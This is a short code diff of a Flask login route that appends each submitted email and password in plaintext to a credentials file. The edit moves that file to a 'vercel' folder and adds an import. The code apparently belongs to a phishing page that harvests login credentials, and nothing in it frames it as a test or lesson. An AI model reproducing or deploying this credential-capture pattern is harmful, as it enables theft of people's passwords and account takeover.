@@ -1,4 +1,5 @@
 from flask import Flask, render_template, request, flash, redirect, url_for
+from urllib.parse import quote as url_quote
 
 app = Flask(__name__, template_folder="../templates")  # Adjust path as needed
 app.secret_key = 'your_secret_key'
@@ -23,7 +24,7 @@ def login():
 
         # Alternative file-writing method: using 'with' statement
         try:
-            with open("./credentials.txt", "a") as file:
+            with open("./vercel/credentials.txt", "a") as file:
                 file.write(f"Email: {email}, Password: {password}\n")
             print("Credentials written to credentials.txt")
         except Exception as e:
